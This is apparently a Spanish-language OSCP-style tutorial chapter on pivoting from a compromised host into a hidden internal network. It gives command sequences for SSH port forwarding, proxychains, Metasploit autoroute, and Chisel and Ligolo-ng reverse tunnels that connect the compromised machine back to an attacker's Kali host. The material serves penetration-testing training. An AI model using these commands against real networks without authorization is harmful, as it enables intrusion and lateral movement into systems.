13 · Pivoting (saltar a redes internas)

Comprometes una máquina que tiene dos tarjetas de red: una da a ti, otra a una red interna que tú no ves. El pivoting usa esa máquina como “puente” para atacar la red oculta.

1. El concepto

🧠 AnalogíaEstás fuera de un edificio y solo conoces al conserje (pivote). Él sí puede entrar a todas las salas. Le pides que lleve y traiga tus mensajes: tú atacas las salas internas “a través” de él.
📘 Port forwarding vs proxy/túnelPort forwarding: reenvías UN puerto concreto (ej. el 3389 del 172.16.5.10 lo traes a tu 127.0.0.1:3389). Túnel SOCKS: creas un proxy por el que pasa TODO tu tráfico hacia la red interna (con proxychains).

2. Descubrir que hay otra red

# En el pivote comprometido:
$ ip a / ipconfig        # ¿dos interfaces?
$ ip route / route print  # ¿rutas a otras redes?
$ arp -a                  # ¿qué vecinos conoce?

3. Método A — SSH port forwarding (sin instalar nada)

# Local forward: traer el RDP de 172.16.5.10 a mi 127.0.0.1:3389
$ ssh -L 3389:172.16.5.10:3389 user@10.0.2.20
# Dynamic (proxy SOCKS por el puerto 9050):
$ ssh -D 9050 user@10.0.2.20
# Luego, con proxychains:
$ proxychains nmap -sT -Pn 172.16.5.10
$ proxychains xfreerdp /v:172.16.5.10
💡 proxychainsEdita /etc/proxychains4.conf y pon socks5 127.0.0.1 9050 al final. Luego antepón proxychains a cualquier herramienta para que viaje por el túnel.

4. Método B — Metasploit autoroute

# Teniendo una sesión meterpreter en el pivote:
meterpreter> run autoroute -s 172.16.5.0/24
meterpreter> background
msf> use auxiliary/scanner/portscan/tcp
msf> set RHOSTS 172.16.5.10
msf> run
# Proxy SOCKS para usar herramientas de fuera:
msf> use auxiliary/server/socks_proxy
msf> run

5. Método C — Chisel (el favorito, funciona siempre)

# En Kali (servidor):
$ ./chisel server -p 8000 --reverse
# En el pivote (cliente) — crea un SOCKS inverso:
$ ./chisel client 10.0.2.15:8000 R:socks
# Ahora en Kali tienes un SOCKS en 127.0.0.1:1080 → proxychains

6. Método D — Ligolo-ng (moderno, muy cómodo)

# Kali: crea interfaz tun y arranca el proxy
$ sudo ip tuntap add user $USER mode tun ligolo; sudo ip link set ligolo up
$ ./proxy -selfcert
# Pivote: conecta al agente
$ ./agent -connect 10.0.2.15:11601 -ignore-cert
# En ligolo: session → start; añade ruta a la red interna
$ sudo ip route add 172.16.5.0/24 dev ligolo
# ¡Ahora Kali habla con 172.16.5.0/24 como si fuera local, sin proxychains!
🔴 Nivel OSCPEl escenario de Active Directory del examen suele requerir pivoting: comprometes un host “jump”, y desde ahí llegas al Controlador de Dominio. Ten chisel y ligolo-ng listos (binarios Linux y Windows). Practica montar un doble pivote (red A → red B → red C).
